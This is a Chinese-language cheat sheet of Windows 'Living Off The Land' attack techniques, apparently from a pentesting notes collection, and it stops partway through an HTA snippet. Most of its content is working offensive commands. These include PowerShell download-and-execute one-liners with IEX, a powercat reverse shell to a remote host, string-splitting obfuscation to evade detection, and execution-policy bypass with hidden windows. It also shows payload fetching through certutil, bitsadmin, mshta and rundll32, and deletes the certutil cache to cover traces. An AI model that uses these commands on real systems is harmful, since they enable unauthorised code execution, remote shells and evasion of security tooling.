# Windows-LOL
`Living Off The Land`
---
## 免责声明
`本文档仅供学习和研究使用,请勿使用文中的技术源码用于非法用途,任何人造成的任何负面影响,与本人无关.`
---
**相关文章**
- [Get Reverse-shell via Windows one-liner](https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/)
- [What Are LOLBins and How Do Attackers Use Them in Fileless Attacks? - Cynet](https://www.cynet.com/attack-techniques-hands-on/what-are-lolbins-and-how-do-attackers-use-them-in-fileless-attacks/)
- [Windows文件下载执行的15种姿势](https://mp.weixin.qq.com/s/tINvBuhiZwz7MbA_sffapA)
- [命令行上线小技巧](https://blog.m1kh.com/index.php/archives/694/)
**相关资源**
- [LOLBAS](https://lolbas-project.github.io/)
- https://github.com/LOLBAS-Project/LOLBAS
---
## Powershell
### 开启执行策略
```powershell
set-ExecutionPolicy RemoteSigned
```
### 关闭执行策略
```powershell
set-ExecutionPolicy Restricted
```
### 远程下载文件保存在本地
```powershell
powershell (new-object System.Net.WebClient).DownloadFile('http://192.168.1.1/1/evil.txt','evil.exe')
# 或
$h=new-object System.Net.WebClient
$h.DownloadFile('https://xxx.com/payload/shell/test.sh','C:\Users\xxx\Desktop\test\test.sh')
```
### 命令行执行 ps1 文件 (绕过本地权限执行)
```powershell
powershell.exe -ExecutionPolicy bypass -File "C:\Users\XX\Desktop\test\test.ps1"
```
ExecutionPolicy Bypass: 绕过执行安全策略，这个参数非常重要，在默认情况下，PowerShell 的安全策略规定了 PowerShell 不允许运行命令和文件。通过设置这个参数，可以绕过任意一个安全保护规则。在渗透测试中，基本每次运行 PowerShell 脚本时都要使用这个参数。
* WindowStyle Hidden: 隐藏窗口。
* NoLogo: 启动不显示版权标志的 PowerShell.
* NonInteractive (-Nonl): 非交互模式，PowerShell 不为用户提供交互的提示。
* NoProfile (-NoP): PowerShell 控制台不加载当前用户的配置文件。
* Noexit: 执行后不退出 Shell。这在使用键盘记录等脚本时非常重要。
### 本地隐藏绕过权限执行脚本
```powershell
PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden NoLogo -NonInteractive -NoProfile File "test.ps1"
```
### 远程下载并执行
```powershell
powershell -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.1.1/1/evil.txt'))"
```
```powershell
powershell IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.1.1/1/powercat.ps1'); powercat -c 192.168.1.1 -p 9999 -e cmd
```
**将命令拆分为字符串，然后进行拼接**
```powershell
powershell "$a='IEX(New-Object Net.WebClient).Downlo';$b='11(''https://xxx.com/payload/test/test.ps1'')'.Replace('11','adString');IEX ($a+$b)"
```
**用IEX下载远程PS1脚本绕过权限执行**
```powershell
PowerShell.exe -ExecutionPolicy Bypass-WindowStyle Hidden-NoProfile-NonI IEX(New-ObjectNet.WebClient).DownloadString("test.ps1");[Parameters]
```
---
## 白名单
### smb
kali 使用 Impacket
```bash
mkdir smb && cd smb
impacket-smbserver share `pwd`
```
windows 命令行下拷贝
```
copy \\IP\share\file.exe file.exe
```
### Bitsadmin
bitsadmin 是一个命令行工具，可用于创建下载或上传工作和监测其进展情况。
```
bitsadmin /transfer n http://192.168.1.1/1/evil.txt d:\test\1.txt
```
### certutil
某些时候，服务器版本过低，无法使用 powershell，这时候可用 certutil 上线。
certutil 用于备份证书服务，支持 xp-win10 都支持。由于 certutil 下载文件都会留下缓存，所以一般都建议下载完文件后对缓存进行删除。
缓存目录为: `%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content`
```bash
# 下载
certutil -urlcache -split -f http://192.168.1.1/evil.txt test.php
# 如果提示拒绝访问，可以在找一个能创建文件夹的目录，创建完之后下载到文件夹里
# bypass技巧
certutil & Certutil -urlcache -split -f  https://xxx.com/test/payload.bin payload.bin
certutil & Certutil -urlcache -split -f  https://xxx.com/test/mian.exe mian.exe & mian.exe
certutil | Certutil -urlcache -split -f  https://xxx.com/test/payload.bin payload1.bin
# 删除缓存
certutil -urlcache -split -f http://192.168.1.1/evil.txt delete
```
### ipc$
```
# 建立远程 IPC 连接
net use \\192.168.1.1\ipc$ /user:administrator "abc123!"
# 复制远程文件到本地主机
copy \\192.168.1.1\c$\2.txt D:\test
```
### MSBuild
- [Use MSBuild To Do More](https://3gstudent.github.io/3gstudent.github.io/Use-MSBuild-To-Do-More/)
### Mshta.exe
Mshta.exe 运行 Microsoft HTML 应用程序主机，这是 Windows OS 实用程序，负责运行 HTA（HTML 应用程序）文件。可以用来运行 JavaScript 或 VBScript 的 HTML 文件。
目标端
```
mshta.exe http://192.168.1.1/test.hta
```
这个基本上已经不好用了,杀软拦截的厉害
### Rundll32.exe
Rundll32.exe 与 Windows 操作系统相关联，可调用从 DLL（16位或32位）导出的函数并将其存储在适当的内存库中。
```cmd
rundll32.exe \\192.168.1.1\test.dll,0
```
**url.dll**
调用 API ShellExecute 打开程序
```
rundll32.exe url.dll,FileProtocolHandler calc.exe
```
执行 js 文件
```js
WScript.Echo("1");
```
```
rundll32.exe url.dll,OpenURL C:\test\echo.js
```
执行 hta 文件
```html
Window.ReSizeTo 0, 0
Window.moveTo -2000,-2000
Set objShell = CreateObject("Wscript.Shell")